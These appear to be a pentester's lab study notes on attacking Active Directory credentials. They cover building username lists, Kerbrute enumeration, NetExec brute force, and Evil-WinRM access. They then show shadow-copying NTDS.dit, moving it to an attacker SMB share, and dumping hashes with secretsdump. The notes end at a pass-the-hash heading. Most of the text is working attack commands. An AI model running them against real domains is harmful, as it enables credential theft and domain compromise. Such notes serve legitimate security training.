- In this section, we will focus on how we can extract credentials through the use of a **`dictionary attack` against `AD accounts` and `dumping hashes` from the `NTDS.dit` file.**
- Once a Windows system is joined to a domain, **it will `no longer default to referencing the SAM database to validate logon requests`.** 
- That domain-joined system **will now send authentication requests to be validated by the domain controller** before allowing a user to log on.
- Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01\nameofuser`) or with direct access to the device then typing `.\` at the logon UI in the `Username` field.

# Dictionary attacks against AD accounts using NetExec
---
- It can be rather `noisy` **(easy to detect)** to conduct dictionary attacks over a network because they can generate a lot of network traffic and alerts on the target system.
- Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:
	- ![[Pasted image 20250630072936.png]]
- Often, an email address's structure **will give us the employee's username (structure: `username@domain`).**
- We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. **==Look at PNPT Notes (OSINT & External Pentest) for more information==**

## Creating a custom list of usernames
- Let's say from OSINT, example list of names:
	- Ben Williamson
	- Bob Burgerstien
	- Jim Stevenson
	- Jill Johnson
	- Jane Doe
- We can create a custom list on our attack host using the names above:
```shell
	bwilliamson
	benwilliamson
	ben.willamson
	willamson.ben
	bburgerstien
	bobburgerstien
	bob.burgerstien
	burgerstien.bob
	jstevenson
	jimstevenson
	jim.stevenson
	stevenson.jim
```

- We can manually create our list(s) or **==use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)==** to convert a list of real names into common username formats.
	- `./username-anarchy -i /home/ltnbob/names.txt`

## Enumerating valid usernames with Kerbrute
- Kerbrute can be used for brute-forcing, password spraying and username enumeration.
- Right now, we are only interested in username enumeration, which would look like this:
	- `kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt`

## Launching a brute-force attack with NetExec
- We can launch a **brute-force attack against the target domain controller** using a tool such as NetExec.
- Here is the command to do so:
	- `netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`
- On any Windows operating system, **an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged.**

# Capturing NTDS.dit
---
- `NT Directory Services` (`NTDS`) is the directory service used with A**D to find & organize network resources.** 
- Recall that `NTDS.dit` **file is stored at `%systemroot%/ntds`** on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).
- The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html)
- This is the primary database file associated with AD and **==stores all domain usernames, password hashes==**, and other critical schema information.

## Connecting to a DC with Evil-WinRM
- `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`

## Checking local group membership
- Once connected, we can check to see what privileges `bwilliamson` has:
	- `net localgroup`
- To make a **==copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin==** (`Domain Admins group`) (or equivalent) rights

## Checking user account privileges including domain
- `net user bwilliamson`

## Creating shadow copy of C:
- We can use `vssadmin` to **create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`)** of the `C:` drive or whatever volume the admin chose when initially installing AD.
- It is **very likely that NTDS will be stored on `C:`** as that is the default location selected at install, **but it is possible to change the location.**
- We use **==VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down==**:
	- `vssadmin CREATE SHADOW /For=C:`

## Copying NTDS.dit from the VSS
- We can then **copy the `NTDS.dit` file from the volume shadow copy of `C:`** onto another location on the drive to prepare to move NTDS.dit to our attack host.
	- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
- **Note:** As was the case with `SAM`, the hashes stored in **==`NTDS.dit` are encrypted with a key stored in `SYSTEM`.==** **In order to successfully extract the hashes, one must download both files.**

## Transferring NTDS.dit to attack host
- `cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData `

## Extracting hashes from NTDS.dit
- `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`


# A faster method: Using NetExec to capture NTDS.dit
---
- `netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil`
- `impacket-secretsdump 'ldap_svc':'Password123'@10.10.10.225 -ntds ntds.dit`


# Pass The Hash
---
- If not cracked, we can Pass them